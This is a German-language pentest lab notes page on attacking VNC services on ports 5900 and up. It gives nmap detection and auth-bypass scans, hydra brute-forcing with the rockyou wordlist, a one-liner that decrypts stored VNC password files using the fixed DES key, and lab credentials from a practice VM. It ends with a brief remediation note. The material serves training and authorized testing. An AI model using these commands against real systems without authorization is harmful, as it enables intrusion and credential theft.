# VNC (5900 / 5901 ...)

> Tauchte im Lab als **Zwischenloesung** auf (VM6): grafischer Zugriff mit schwachem Passwort.
> Oft vergessen, manchmal direkter Weg auf den Desktop.

## Erkennen

```bash
nmap -p5900-5903 -sV 192.168.1.101
nmap -p5900 --script vnc-info,vnc-title,realvnc-auth-bypass 192.168.1.101
```

## Verbinden

```bash
vncviewer 192.168.1.101:5900          # fragt nach Passwort
vncviewer 192.168.1.101::5900         # alternative Port-Notation
```

## Schwaches/bekanntes Passwort

VNC-Passwoerter sind auf 8 Zeichen begrenzt und oft trivial.

```bash
# Brute-Force
hydra -P /usr/share/wordlists/rockyou.txt 192.168.1.101 vnc

# Gespeichertes VNC-Passwort entschluesseln (z. B. aus gefundener .vnc/passwd-Datei)
# (festes DES-Schluesselverfahren -> trivial umkehrbar)
echo -n "<hexstring>" | xxd -r -p | openssl enc -des-cbc -d -K e84ad660c4721ae0 -iv 0 -nopad
```

> **Lab (VM6, Frage 4):** Neben dem SSH-Brute (`jenny:iloveyou`) war als Zwischenloesung
> VNC auf Port 5900 mit dem Passwort `rockyou` moeglich und wurde als alternativer Zugang
> bestaetigt.

## Behebung

- Starkes VNC-Passwort + Transport-Verschluesselung (SSH-Tunnel/TLS); VNC nicht offen exponieren.

## -> Weiter

- Nach Desktop-Zugriff -> [Windows PrivEsc](../../03-PrivEsc/Windows/README.md) bzw. [Linux PrivEsc](../../03-PrivEsc/Linux/README.md)
